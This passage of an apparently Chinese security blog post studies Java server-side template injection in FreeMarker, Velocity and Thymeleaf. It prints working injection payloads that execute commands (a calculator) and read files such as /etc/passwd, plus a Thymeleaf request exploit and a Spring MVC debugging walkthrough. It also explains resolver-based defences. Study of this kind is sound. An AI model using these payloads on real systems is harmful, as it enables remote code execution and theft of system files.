+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token operator">&lt;</span>#assign ex<span class="token operator">=</span><span class="token string">"freemarker.template.utility.Execute"</span><span class="token operator">?</span><span class="token keyword">new</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">></span> $<span class="token punctuation">&#123;</span> <span class="token function">ex</span><span class="token punctuation">(</span><span class="token string">"Calc"</span><span class="token punctuation">)</span> <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>读取文件</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token operator">&lt;</span>#assign is<span class="token operator">=</span>object<span class="token operator">?</span>api<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getResourceAsStream</span><span class="token punctuation">(</span><span class="token string">"/Test.class"</span><span class="token punctuation">)</span><span class="token operator">></span>
+FILE<span class="token operator">:</span><span class="token punctuation">[</span><span class="token operator">&lt;</span>#list <span class="token number">0.</span><span class="token number">.999999999</span> as _<span class="token operator">></span>
+    <span class="token operator">&lt;</span>#assign <span class="token keyword">byte</span><span class="token operator">=</span>is<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">></span>
+    <span class="token operator">&lt;</span>#<span class="token keyword">if</span> <span class="token keyword">byte</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token operator">></span>
+        <span class="token operator">&lt;</span>#<span class="token keyword">break</span><span class="token operator">></span>
+    <span class="token operator">&lt;</span><span class="token operator">/</span>#<span class="token keyword">if</span><span class="token operator">></span>
+$<span class="token punctuation">&#123;</span><span class="token keyword">byte</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token operator">/</span>#list<span class="token operator">></span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token operator">&lt;</span>#assign uri<span class="token operator">=</span>object<span class="token operator">?</span>api<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getResource</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toURI</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">></span>
+<span class="token operator">&lt;</span>#assign input<span class="token operator">=</span>uri<span class="token operator">?</span>api<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span><span class="token string">"file:///etc/passwd"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toURL</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">openConnection</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">></span>
+<span class="token operator">&lt;</span>#assign is<span class="token operator">=</span>input<span class="token operator">?</span>api<span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">></span>
+FILE<span class="token operator">:</span><span class="token punctuation">[</span><span class="token operator">&lt;</span>#list <span class="token number">0.</span><span class="token number">.999999999</span> as _<span class="token operator">></span>
+    <span class="token operator">&lt;</span>#assign <span class="token keyword">byte</span><span class="token operator">=</span>is<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">></span>
+    <span class="token operator">&lt;</span>#<span class="token keyword">if</span> <span class="token keyword">byte</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token operator">></span>
+        <span class="token operator">&lt;</span>#<span class="token keyword">break</span><span class="token operator">></span>
+    <span class="token operator">&lt;</span><span class="token operator">/</span>#<span class="token keyword">if</span><span class="token operator">></span>
+$<span class="token punctuation">&#123;</span><span class="token keyword">byte</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token operator">/</span>#list<span class="token operator">></span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>从 <strong>2.3.17</strong>版本以后，官方版本提供了三种TemplateClassResolver对类进行解析：<br>1、UNRESTRICTED_RESOLVER：可以通过 <code>ClassUtil.forName(className)</code> 获取任何类。</p>
+<p>2、SAFER_RESOLVER：不能加载 <code>freemarker.template.utility.JythonRuntime</code>、<code>freemarker.template.utility.Execute</code>、<code>freemarker.template.utility.ObjectConstructor</code>这三个类。<br>3、ALLOWS_NOTHING_RESOLVER：不能解析任何类。<br>可通过<code>freemarker.core.Configurable#setNewBuiltinClassResolver</code>方法设置<code>TemplateClassResolver</code>，从而限制通过<code>new()</code>函数对<code>freemarker.template.utility.JythonRuntime</code>、<code>freemarker.template.utility.Execute</code>、<code>freemarker.template.utility.ObjectConstructor</code>这三个类的解析。</p>
+<ul>
+<li>比较其他两个模板引擎来说，FreeMarker 的 SSTI 更为严格一些，它的防护也做的相当有力，这个给自己挖个小坑吧，后续去看一看 FreeMarker 的代码当中是否存在强而有力的 bypass payload</li>
+</ul>
+<h4 id="FreeMarker-SSTI-修复"><a href="#FreeMarker-SSTI-修复" class="headerlink" title="FreeMarker SSTI 修复"></a>FreeMarker SSTI 修复</h4><blockquote>
+<p>因为 FreeMarker 不能直接传参打，所以此处的代码参考奶思师傅。</p>
+</blockquote>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">freemarker</span><span class="token punctuation">;</span>
+
+<span class="token keyword">import</span> <span class="token namespace">freemarker<span class="token punctuation">.</span>cache<span class="token punctuation">.</span></span><span class="token class-name">StringTemplateLoader</span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token namespace">freemarker<span class="token punctuation">.</span>core<span class="token punctuation">.</span></span><span class="token class-name">TemplateClassResolver</span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token namespace">freemarker<span class="token punctuation">.</span>template<span class="token punctuation">.</span></span><span class="token class-name">Configuration</span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token namespace">freemarker<span class="token punctuation">.</span>template<span class="token punctuation">.</span></span><span class="token class-name">Template</span><span class="token punctuation">;</span>
+
+<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">OutputStreamWriter</span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">StringWriter</span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span><span class="token punctuation">;</span>
+
+<span class="token keyword">public</span> <span class="token keyword">class</span> freemarker_ssti <span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>
+
+        <span class="token comment">//设置模板</span>
+        <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">></span></span> map <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">String</span> poc <span class="token operator">=</span><span class="token string">"&lt;#assign aaa=\"freemarker.template.utility.Execute\"?new()> $&#123; aaa(\"open -a Calculator.app\") &#125;"</span><span class="token punctuation">;</span>
+        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>poc<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">StringTemplateLoader</span> stringLoader <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringTemplateLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">Configuration</span> cfg <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Configuration</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        stringLoader<span class="token punctuation">.</span><span class="token function">putTemplate</span><span class="token punctuation">(</span><span class="token string">"name"</span><span class="token punctuation">,</span>poc<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        cfg<span class="token punctuation">.</span><span class="token function">setTemplateLoader</span><span class="token punctuation">(</span>stringLoader<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token comment">//cfg.setNewBuiltinClassResolver(TemplateClassResolver.SAFER_RESOLVER);</span>
+        <span class="token comment">//处理解析模板</span>
+        <span class="token class-name">Template</span> <span class="token class-name">Template_name</span> <span class="token operator">=</span> cfg<span class="token punctuation">.</span><span class="token function">getTemplate</span><span class="token punctuation">(</span><span class="token string">"name"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">StringWriter</span> stringWriter <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token class-name">Template_name</span><span class="token punctuation">.</span><span class="token function">process</span><span class="token punctuation">(</span><span class="token class-name">Template_name</span><span class="token punctuation">,</span>stringWriter<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<img src="/2022/11/07/Java-OWASP-SSTI-%E5%AD%A6%E4%B9%A0/SuccessFreeMarkerDefense.png" class="">
+
+<h2 id="0x03-Velocity-SSTI"><a href="#0x03-Velocity-SSTI" class="headerlink" title="0x03 Velocity SSTI"></a>0x03 Velocity SSTI</h2><h3 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h3><p><code>#</code> 关键字<br>Velocity关键字都是使用 <code>#</code>开头的，如 <code>#set</code>、<code>#if</code>、<code>#else</code>、<code>#end</code>、<code>#foreach</code> 等<br><code>$</code>变量<br>Velocity变量都是使用$开头的，如：<code>$name</code>、<code>$msg</code><br><code>&#123;&#125;</code>变量<br>Velocity对于需要明确表示的Velocity变量，可以使用 <code>&#123;&#125;</code> 将变量包含起来。<br><code>！</code>变量<br>如果某个Velocity变量不存在，那么页面中就会显示<code>$xxx</code>的形式，为了避免这种形式，可以在变量名称前加上！。如页面中含有<code>$msg</code>，如果msg有值，将显示msg的值；如果不存在就会显示<code>$msg</code>。这是我们不希望看到的，为了把不存在的变量显示为空白，可以使用<code>$!msg</code>。</p>
+<p>直接打是可以的，当然配合 FJ 更优雅。</p>
+<p>此处的攻击面还是以文件上传和模板编写为主，在 jpress 的代码审计当中，师傅们可以看到那就是一个模板编写的攻击手法。</p>
+<h3 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>这已在 jpress 中分析过了，不再赘述，对应地址：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/11832#toc-4%EF%BC%8C%E8%99%BD%E7%84%B6%E9%82%A3%E4%B8%AA%E6%A1%86%E6%9E%B6%E6%98%AF">https://xz.aliyun.com/t/11832#toc-4，虽然那个框架是</a> jBoot，但是总体上是大差不差的</p>
+<h2 id="0x04-Thymeleaf-SSTI"><a href="#0x04-Thymeleaf-SSTI" class="headerlink" title="0x04 Thymeleaf SSTI"></a>0x04 Thymeleaf SSTI</h2><h3 id="Thymeleaf-语法基础"><a href="#Thymeleaf-语法基础" class="headerlink" title="Thymeleaf 语法基础"></a>Thymeleaf 语法基础</h3><p>Thymeleaf 表达式可以有以下类型：</p>
+<ul>
+<li><code>$&#123;...&#125;</code>：变量表达式 —— 通常在实际应用，一般是OGNL表达式或者是 Spring EL，如果集成了Spring的话，可以在上下文变量（context variables ）中执行</li>
+<li><code>*&#123;...&#125;</code>: 选择表达式 —— 类似于变量表达式，区别在于选择表达式是在当前选择的对象而不是整个上下文变量映射上执行。</li>
+<li><code>#&#123;...&#125;</code>: Message (i18n) 表达式 —— 允许从外部源（比如<code>.properties</code>文件）检索特定于语言环境的消息</li>
+<li><code>@&#123;...&#125;</code>: 链接 (URL) 表达式 —— 一般用在应用程序中设置正确的 URL&#x2F;路径（URL重写）。</li>
+<li><code>~&#123;...&#125;</code>：片段表达式 —— <strong>Thymeleaf 3.x 版本新增的内容</strong>，分段段表达式是一种表示标记片段并将其移动到模板周围的简单方法。 正是由于这些表达式，片段可以被复制，或者作为参数传递给其他模板等等</li>
+</ul>
+<p>实际上，Thymeleaf 出现 SSTI 问题的主要原因也正是因为这个片段表达式，我们知道片段表达式语法如下：</p>
+<ul>
+<li>Thymeleaf SSTI 本质上还是 SpEL 表达式注入。</li>
+</ul>
+<p>实际上，只有 3.x 版本的 Thymeleaf 才会受到影响，因为在 2.x 中<code>renderFragment</code>的核心处理方法是这样的：</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">renderFragment</span><span class="token punctuation">(</span><span class="token class-name">Set</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">></span></span> markupSelectorsToRender<span class="token punctuation">,</span> <span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token operator">?</span><span class="token punctuation">></span></span> model<span class="token punctuation">,</span> <span class="token class-name">HttpServletRequest</span> request<span class="token punctuation">,</span> <span class="token class-name">HttpServletResponse</span> response<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>
+        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+                <span class="token class-name">Configuration</span> configuration <span class="token operator">=</span> viewTemplateEngine<span class="token punctuation">.</span><span class="token function">getConfiguration</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token class-name">ProcessingContext</span> processingContext <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ProcessingContext</span><span class="token punctuation">(</span>context<span class="token punctuation">)</span><span class="token punctuation">;</span>
+                templateCharacterEncoding <span class="token operator">=</span> <span class="token function">getStandardDialectPrefix</span><span class="token punctuation">(</span>configuration<span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token class-name">StandardFragment</span> fragment <span class="token operator">=</span> <span class="token class-name">StandardFragmentProcessor</span><span class="token punctuation">.</span><span class="token function">computeStandardFragmentSpec</span><span class="token punctuation">(</span>configuration<span class="token punctuation">,</span> processingContext<span class="token punctuation">,</span> viewTemplateName<span class="token punctuation">,</span> templateCharacterEncoding<span class="token punctuation">,</span> <span class="token string">"fragment"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token keyword">if</span> <span class="token punctuation">(</span>fragment <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+                    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">IllegalArgumentException</span><span class="token punctuation">(</span><span class="token string">"Invalid template name specification: '"</span> <span class="token operator">+</span> viewTemplateName <span class="token operator">+</span> <span class="token string">"'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token punctuation">&#125;</span>   
+        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>并没有3.x 版本中对于片段表达式（<code>~&#123;</code>）的处理，也因此不会造成 SSTI 漏洞，以下是 SpringBoot 默认引用的 thymeleaf 版本</p>
+<blockquote>
+<p>spring boot:1.5.1.RELEASE spring-boot-starter-thymeleaf:2.1.5<br>spring boot:2.0.0.RELEASE spring-boot-starter-thymeleaf:3.0.9<br>spring boot:2.2.0.RELEASE spring-boot-starter-thymeleaf:3.0.11</p>
+</blockquote>
+<p>先用这一 EXP 打</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token operator">/</span>path<span class="token operator">?</span>lang<span class="token operator">=</span>__$<span class="token operator">%</span><span class="token number">7</span>bnew<span class="token operator">%</span><span class="token number">20</span>java<span class="token punctuation">.</span>util<span class="token punctuation">.</span><span class="token function">Scanner</span><span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Runtime</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"Calc"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">7d</span>__<span class="token operator">::</span><span class="token punctuation">.</span>x<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h3 id="Spring-MVC-对于-Thymeleaf-的解析流程"><a href="#Spring-MVC-对于-Thymeleaf-的解析流程" class="headerlink" title="Spring MVC 对于 Thymeleaf 的解析流程"></a>Spring MVC 对于 Thymeleaf 的解析流程</h3><ul>
+<li>大致流程图可以参照下图</li>
+</ul>
+<img src="/2022/11/07/Java-OWASP-SSTI-%E5%AD%A6%E4%B9%A0/mvc.png" class="">
+
+<p>下个断点在 <code>org.springframework.web.servlet.DispatcherServlet#doService</code>，因为 <code>DispatcherServlet</code> 是 Spring 对前端控制器的默认拦截器。</p>
+<h4 id="获取-Handler"><a href="#获取-Handler" class="headerlink" title="获取 Handler"></a>获取 Handler</h4><img src="/2022/11/07/Java-OWASP-SSTI-%E5%AD%A6%E4%B9%A0/doService.png" class="">
+
+<p>到 429 行，调用了 <code>this.doDispatch()</code> 方法，去寻找对应的 Handler Mappings，再由 Handle Mapping 返回 Controller，再去寻找对应的 Controller</p>
+<img src="/2022/11/07/Java-OWASP-SSTI-%E5%AD%A6%E4%B9%A0/doDispatchThymeleaf.png" class="">
+
+<p>要寻找对应的 Handler Mappings，需要先获取到 <code>Handler</code>，所以在第 484 行调用了 <code>getHandler()</code> 方法，跟进一下。</p>
+<img src="/2022/11/07/Java-OWASP-SSTI-%E5%AD%A6%E4%B9%A0/getHandler.png" class="">
+
+<p>现在我们的 <code>Handler Mappings</code> 里存在五个 Handler，程序会通过迭代器进行遍历，我们跟进一下具体 Handler 的 <code>getHandler()</code> 方法做了什么业务。</p>
+<img src="/2022/11/07/Java-OWASP-SSTI-%E5%AD%A6%E4%B9%A0/HandlerSeek.png" class="">
+
+<p>再跟进 <code>getHandlerInternal()</code> 方法，以及跟进父类的 <code>getHandlerInternal()</code> 方法</p>
+<img src="/2022/11/07/Java-OWASP-SSTI-%E5%AD%A6%E4%B9%A0/getHandlerInternal.png" class="">
+
+<p>关注一下返回值，是 var4，而 var4 是通过 <code>this.lookupHandlerMethod()</code> 调用获得的。所以此处，我们跟进 <code>lookupHandlerMethod()</code> 方法</p>
+<img src="/2022/11/07/Java-OWASP-SSTI-%E5%AD%A6%E4%B9%A0/superGetHandlerInternal.png" class="">
+
+<p><code>lookupHandlerMethod()</code> 方法首先把 Web 应用程序被访问的子域拿出来，保存到一个数字当中，这个子域的变量名为 <code>lookupPath</code>，如果无法通过 uri 进行直接匹配，则对所有的注册的 RequestMapping 进行匹配。</p>
+<p>这里无法通过 uri 匹配的情况主要有三种： </p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">// ①在RequestMapping中定义的是PathVariable，如/user/detail/&#123;id&#125;； </span>
+<span class="token comment">// ②在RequestMapping中定义了问号表达式，如/user/?etail； </span>
+<span class="token comment">// ③在RequestMapping中定义了*或**匹配，如/user/detail/** // No choice but to go through all mappings...</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<img src="/2022/11/07/Java-OWASP-SSTI-%E5%AD%A6%E4%B9%A0/lookupPath.png" class="">
+
+<h4 id="获取-Controller-并返回-Model-And-View"><a href="#获取-Controller-并返回-Model-And-View" class="headerlink" title="获取 Controller 并返回 Model And View"></a>获取 Controller 并返回 Model And View</h4><p>使用一个比较器，对匹配的结果进行排序，获取相似度最高的一个作为结果返回，也就是 <code>get(0)</code>，而当存在两个匹配结果重合度一致的时候，抛出异常。这里匹配的结果是去 Controller 当中找的，寻找哪个接口与 path 最符合，因为有时候接口名相同，但传参不同。</p>
+<img src="/2022/11/07/Java-OWASP-SSTI-%E5%AD%A6%E4%B9%A0/Comparator.png" class="">
+
+<p>很明显看到这里，返回的是 <code>GET /path</code> </p>
+<img src="/2022/11/07/Java-OWASP-SSTI-%E5%AD%A6%E4%B9%A0/GetSortedPath.png" class="">
+
+<ul>
+<li>至此，<code>getHandler()</code> 的分析流程结束了，我们能够很明显的看出来它是在做 Handler Mapping 的获取与比对的操作，是为了下一步 Controller 服务的。</li>
+</ul>
+<p>回到 <code>DispatcherServlet</code> 一路往下走，到第 490 行，跟进 <code>getHandlerAdapter()</code> 方法看一下。</p>
+<img src="/2022/11/07/Java-OWASP-SSTI-%E5%AD%A6%E4%B9%A0/getHandlerAdapter.png" class="">
+
+<p>找到目标处理器的适配器，用适配器执行目标方法。继续往下走，调用 <code>applyPreHandle()</code> 方法做了一个预处理。跟进 <code>interceptor.preHandle()</code></p>
+<img src="/2022/11/07/Java-OWASP-SSTI-%E5%AD%A6%E4%B9%A0/applyPreHandle.png" class="">
+
+<img src="/2022/11/07/Java-OWASP-SSTI-%E5%AD%A6%E4%B9%A0/preHandle.png" class="">
+
+<ul>
+<li>基本上的正常请求都是会返回 true 的，一些非常规请求很可能返回 false</li>
+</ul>
+<p>回到 <code>DispatcherServlet</code>，在它的第 504 行，进行了 <code>handle</code> 处理，实现执行 Controller 中 (Handler) 的方法,返回 ModelAndView 视图。跟进</p>
+<img src="/2022/11/07/Java-OWASP-SSTI-%E5%AD%A6%E4%B9%A0/handle.png" class="">
+
+<img src="/2022/11/07/Java-OWASP-SSTI-%E5%AD%A6%E4%B9%A0/handleInternal.png" class="">
+
+<p>跟进至 <code>invokeHandlerMethod()</code>，才到了真正的业务方法。</p>
+<img src="/2022/11/07/Java-OWASP-SSTI-%E5%AD%A6%E4%B9%A0/invokeHandlerMethod.png" class="">
+
+<p><code>invokeHandlerMethod()</code> 方法先执行目标的 <code>HandlerMethod</code>，并返回一个 <code>ModelAndView</code> 对象。比较重要的方法在第 520 行，此处的 handlerMethod 其实是 <code>com.drunkbaby.ssti.controller.ThymeleafController#path(String)</code>，这一个方法，通过 <code>this.createInvocableHandlerMethod()</code> 方法，将其封装成 <code>ServletInvocableHandlerMethod</code> 类，并让其具有 invoke 执行能力。</p>
+<img src="/2022/11/07/Java-OWASP-SSTI-%E5%AD%A6%E4%B9%A0/createInvocableHandlerMethod.png" class="">
+
+<p>后续，给 <code>invocableMethod</code> 的各大属性赋值，在赋值完毕后 new 了一个 <code>ModelAndViewContainer</code> 对象，后续会将所有的值保存到这一个对象中。</p>
+<img src="/2022/11/07/Java-OWASP-SSTI-%E5%AD%A6%E4%B9%A0/ModelAndViewContainer.png" class="">
+
+<p>往下走，先调用 <code>AsyncWebRequest</code> 进行异步请求的包装，后续针对是否是异步请求，做不同的处理。继续往下走，到 553 行的地方是关键点，它调用了 <code>ServletInvocableHandlerMethod.invokeAndHandle()</code> 方法，调用这个方法的作用主要是获取到了 returnValueHandlers，跟进看一下。</p>
+<img src="/2022/11/07/Java-OWASP-SSTI-%E5%AD%A6%E4%B9%A0/invokeAndHandleSpecfic.png" class="">
+
+<p>跟进 <code>invokeForRequest()</code>，先获取到参数，再调用 <code>this.doInvoke()</code> </p>
+<img src="/2022/11/07/Java-OWASP-SSTI-%E5%AD%A6%E4%B9%A0/invokeForRequest.png" class="">
+
+<p>跟进 <code>doInvoke()</code>，会反射调用路由中类中的方法，并将参数进行传递</p>
+<img src="/2022/11/07/Java-OWASP-SSTI-%E5%AD%A6%E4%B9%A0/doInvoke.png" class="">
+
+<p>此处 f8，会走到我们定义接口的方法中去。</p>
+<img src="/2022/11/07/Java-OWASP-SSTI-%E5%AD%A6%E4%B9%A0/ControllerPass.png" class="">
+
+<p>执行完毕后，回到 <code>org.springframework.web.servlet.mvc.method.annotation.ServletInvocableHandlerMethod</code>，一路往下走，到第 69 行，调用了 <code>handleReturnValue()</code>，跟进 <code>handler.handleReturnValue()</code></p>
+<img src="/2022/11/07/Java-OWASP-SSTI-%E5%AD%A6%E4%B9%A0/handleReturnValue.png" class="">
+
+<p>上面判断如果<code>redirect:</code>开头，如果是的话则设置重定向的属性</p>
+<img src="/2022/11/07/Java-OWASP-SSTI-%E5%AD%A6%E4%B9%A0/viewNameMethodReturnValueHandler.png" class="">
+
+<p>回到<code>org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter#invokeHandlerMethod</code></p>
+<p>这里调用 <code>this.getModelAndView</code> 获取获取 <code>ModelAndView</code> 对象</p>
+<img src="/2022/11/07/Java-OWASP-SSTI-%E5%AD%A6%E4%B9%A0/getModelAndView.png" class="">
+
+<h4 id="View-Resolver-与执行模板渲染"><a href="#View-Resolver-与执行模板渲染" class="headerlink" title="View Resolver 与执行模板渲染"></a>View Resolver 与执行模板渲染</h4><ul>
+<li>目前程序已获取到了 <code>ModelAndView</code>，应当进行下一步的模板渲染工作了，回到 <code>org.springframework.web.servlet.DispatcherServlet#doDispatch</code> 方法。</li>
+</ul>
+<p>之前断点是下在 504 行的位置 ———— <code>ha.handle()</code> 处，我们继续往下走，到第 510 行，调用了 <code>mappedHandler.applyPostHandle()</code> 方法，mappedHandler 是一个 HandlerExecutionChain，类似于处理器的执行链。</p>
+<img src="/2022/11/07/Java-OWASP-SSTI-%E5%AD%A6%E4%B9%A0/applyPostHandle.png" class="">
+
+<p>遍历执行拦截器postHandle，与之前获取 Handler 的流程是一致的。遍历拦截器的过程在 mvc 架构当中非常常见，比如 S2 系列的漏洞分析，也会经过拦截器的遍历。</p>
+<p>在遍历结束后，会走到 <code>this.processDispatchResult()</code> 这里，它会将 Dispatch 的结果进行加工处理，猜测这里很可能会做视图解析与渲染的工作。跟进一下</p>
+<img src="/2022/11/07/Java-OWASP-SSTI-%E5%AD%A6%E4%B9%A0/processDispatchResultRender.png" class="">
+
+<p>在判断完 <code>ModelAndView</code> 不为空之后，调用 <code>render()</code> 方法，<code>render()</code> 方法在 Java 的模板引擎当中一般都是作为模板渲染的方法，跟进一下。</p>
+<img src="/2022/11/07/Java-OWASP-SSTI-%E5%AD%A6%E4%B9%A0/ThymeleafRender.png" class="">
+
+<p>就简单分析一下代码，前面做的是一些国际化的判断，以及赋值等，将一些属性都放到 view 这个对象当中。</p>
+<img src="/2022/11/07/Java-OWASP-SSTI-%E5%AD%A6%E4%B9%A0/view.png" class="">
+
+<p>往下分析，到第 739 行，通过自己的模板引擎进行渲染，如果此处是 FreeMarker，就会去 <code>FreeMarkerView.render()</code>，如果是 Velocity，就会去 <code>VelocityView.render()</code>，我们此处是 Thymeleaf，会去到 <code>ThymeleafView.render()</code>，跟进。</p>
+<img src="/2022/11/07/Java-OWASP-SSTI-%E5%AD%A6%E4%B9%A0/ThymeleafViewRender.png" class="">
+
+<p>跟进 <code>renderFragment()</code> 方法。在第 101 行，判断 <code>getTemplateName</code> 当中是否存在 <code>::</code> 这一字符，如果不存在，则不做解析处理。</p>
+<img src="/2022/11/07/Java-OWASP-SSTI-%E5%AD%A6%E4%B9%A0/contains.png" class="">
+
+<p>继续往下走，第 109 行，调用了 <code>(FragmentExpression)parser.parseExpression()</code>，对我们输入的这一串字符进行了处理。</p>
+<img src="/2022/11/07/Java-OWASP-SSTI-%E5%AD%A6%E4%B9%A0/parseExpression.png" class="">
+
+<p>继续跟进 <code>StandardExpressionPreprocessor.preprocess()</code></p>
+<img src="/2022/11/07/Java-OWASP-SSTI-%E5%AD%A6%E4%B9%A0/preprocess.png" class="">
+
+<ul>
+<li>先判断，input 里面是否有存在 <code>_</code> 字符，如果不存在则直接返回，不做解析处理。</li>
+</ul>
+<p>接着，调用 <code>PREPROCESS_EVAL_PATTERN.matcher(input);</code>，进行正则提取，这里提取的是 <code>_</code> 中间的内容。</p>
+<p>提取后获取到的内容是 <code>$&#123;new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(&quot;Calc&quot;).getInputStream()).next()&#125;</code></p>
